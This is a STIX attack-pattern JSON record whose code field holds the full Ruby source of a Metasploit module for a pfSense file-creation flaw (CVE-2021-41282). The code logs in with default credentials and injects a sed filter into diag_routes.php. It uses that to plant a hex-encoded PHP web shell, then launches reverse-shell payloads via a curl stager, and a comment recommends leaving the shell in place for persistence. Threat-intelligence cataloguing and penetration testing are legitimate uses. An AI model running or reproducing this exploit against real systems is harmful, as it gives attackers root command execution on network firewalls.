{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b28d004c-defb-41d0-bf61-363587dd1d69",
    "created": "2024-08-14T17:14:42.788851Z",
    "modified": "2024-08-14T17:14:42.788855Z",
    "name": "pfSense Diag Routes Web Shell Upload",
    "description": " This module exploits an arbitrary file creation vulnerability in the pfSense",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pfsense_diag_routes_webshell.rb",
            "external_id": "pfsense_diag_routes_webshell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-41282"
        },
        {
            "source_name": "reference",
            "url": "https://www.shielder.it/advisories/pfsense-remote-command-execution/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'pfSense Diag Routes Web Shell Upload',\n        'Description' => %q{\n          This module exploits an arbitrary file creation vulnerability in the pfSense\n          HTTP interface (CVE-2021-41282). The vulnerability affects versions <= 2.5.2\n          and can be exploited by an authenticated user if they have the\n          \"WebCfg - Diagnostics: Routing tables\" privilege.\n\n          This module uses the vulnerability to create a web shell and execute payloads\n          with root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Abdel Adim \"smaury\" Oisfi of Shielder', # vulnerability discovery\n          'jbaines-r7' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2021-41282'],\n          ['URL', 'https://www.shielder.it/advisories/pfsense-remote-command-execution/']\n        ],\n        'DisclosureDate' => '2022-02-23',\n        'Platform' => ['unix', 'bsd'],\n        'Arch' => [ARCH_CMD, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_openssl'\n              },\n              'Payload' => {\n                'Append' => ' & disown'\n              }\n            }\n          ],\n          [\n            'BSD Dropper',\n            {\n              'Platform' => 'bsd',\n              'Arch' => [ARCH_X64],\n              'Type' => :bsd_dropper,\n              'CmdStagerFlavor' => [ 'curl' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'bsd/x64/shell_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'pfsense']),\n      OptString.new('WEBSHELL_NAME', [false, 'The name of the uploaded webshell. This value is random if left unset', nil]),\n      OptBool.new('DELETE_WEBSHELL', [true, 'Indicates if the webshell should be deleted or not.', true])\n    ]\n\n    @webshell_uri = '/'\n    @webshell_path = '/usr/local/www/'\n  end\n\n  # Authenticate and attempt to exploit the diag_routes.php upload. Unfortunately,\n  # pfsense permissions can be so locked down that we have to try direct exploitation\n  # in order to determine vulnerability. A user can even be restricted from the\n  # dashboard (where other pfsense modules extract the version).\n  def check\n    # Grab a CSRF token so that we can log in\n    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/index.php'))\n    return CheckCode::Unknown(\"Didn't receive a response from the target.\") unless res\n    return CheckCode::Unknown(\"Unexpected HTTP response from index.php: #{res.code}\") unless res.code == 200\n    return CheckCode::Unknown('Could not find pfSense title html tag') unless res.body.include?('<title>pfSense - Login')\n\n    /var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body\n    return CheckCode::Unknown('Could not find CSRF token') unless csrf\n\n    # send the log in attempt\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        '__csrf_magic' => csrf,\n        'usernamefld' => datastore['USERNAME'],\n        'passwordfld' => datastore['PASSWORD'],\n        'login' => ''\n      }\n    )\n\n    return CheckCode::Detected('No response to log in attempt.') unless res\n    return CheckCode::Detected('Log in failed. User provided invalid credentials.') unless res.code == 302\n\n    # save the auth cookie for later user\n    @auth_cookies = res.get_cookies\n\n    # attempt the exploit. Upload a random file to /usr/local/www/ with random contents\n    filename = Rex::Text.rand_text_alpha(4..12)\n    contents = Rex::Text.rand_text_alpha(16..32)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/diag_routes.php'),\n      'cookie' => @auth_cookies,\n      'encode_params' => false,\n      'vars_get' => {\n        'isAjax' => '1',\n        'filter' => \".*/!d;};s/Destination/#{contents}/;w+#{@webshell_path}#{filename}%0a%23\"\n      }\n    })\n\n    return CheckCode::Safe('No response to upload attempt.') unless res\n    return CheckCode::Safe(\"Exploit attempt did not receive 200 OK: #{res.code}\") unless res.code == 200\n\n    # Validate the exploit was successful by requesting the uploaded file\n    res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path, \"/#{filename}\"), 'cookie' => @auth_cookies })\n    return CheckCode::Safe('No response to exploit validation check.') unless res\n    return CheckCode::Safe(\"Exploit validation check did not receive 200 OK: #{res.code}\") unless res.code == 200\n\n    register_file_for_cleanup(\"#{@webshell_path}#{filename}\")\n    CheckCode::Vulnerable()\n  end\n\n  # Using the path traversal, upload a php webshell to the remote target\n  def drop_webshell\n    webshell_location = normalize_uri(target_uri.path, \"#{@webshell_uri}#{@webshell_name}\")\n    print_status(\"Uploading webshell to #{webshell_location}\")\n\n    # php_webshell = '<?php if(isset($_GET[\"cmd\"])) { system($_GET[\"cmd\"]); } ?>'\n    php_shell = '\\\\x3c\\\\x3fphp+if($_GET[\\\\x22cmd\\\\x22])+\\\\x7b+system($_GET[\\\\x22cmd\\\\x22])\\\\x3b+\\\\x7d+\\\\x3f\\\\x3e'\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/diag_routes.php'),\n      'cookie' => @auth_cookies,\n      'encode_params' => false,\n      'vars_get' => {\n        'isAjax' => '1',\n        'filter' => \".*/!d;};s/Destination/#{php_shell}/;w+#{@webshell_path}#{@webshell_name}%0a%23\"\n      }\n    })\n\n    fail_with(Failure::Disconnected, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP status code #{res.code}\") unless res.code == 200\n\n    # Test the web shell installed by echoing a random string and ensure it appears in the res.body\n    print_status('Testing if web shell installation was successful')\n    rand_data = Rex::Text.rand_text_alphanumeric(16..32)\n    res = execute_via_webshell(\"echo #{rand_data}\")\n    fail_with(Failure::UnexpectedReply, 'Web shell execution did not appear to succeed.') unless res.body.include?(rand_data)\n    print_good(\"Web shell installed at #{webshell_location}\")\n\n    # This is a great place to leave a web shell for persistence since it doesn't require auth\n    # to touch it. By default, we'll clean this up but the attacker has to option to leave it\n    if datastore['DELETE_WEBSHELL']\n      register_file_for_cleanup(\"#{@webshell_path}#{@webshell_name}\")\n    end\n  end\n\n  # Executes commands via the uploaded webshell\n  def execute_via_webshell(cmd)\n    if target['Type'] == :bsd_dropper\n      # the bsd dropper using the reverse shell payload + curl cmdstager doesn't have a good\n      # way to force the payload to background itself (and thus allow the HTTP response to\n      # to return). So we hack it in ourselves. This identifies the ending file cleanup\n      # which should be right after executing the payload.\n      cmd = cmd.sub(';rm -f /tmp/', ' & disown;rm -f /tmp/')\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, \"#{@webshell_uri}#{@webshell_name}\"),\n      'vars_get' => {\n        'cmd' => cmd\n      }\n    })\n\n    fail_with(Failure::Disconnected, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP status code #{res.code}\") unless res.code == 200\n    res\n  end\n\n  def execute_command(cmd, _opts = {})\n    execute_via_webshell(cmd)\n  end\n\n  def exploit\n    # create a randomish web shell name if the user doesn't specify one\n    @webshell_name = datastore['WEBSHELL_NAME'] || \"#{Rex::Text.rand_text_alpha(5..12)}.php\"\n\n    drop_webshell\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :bsd_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-02-23",
    "x_mitre_platforms": [
        "bsd'"
    ]
}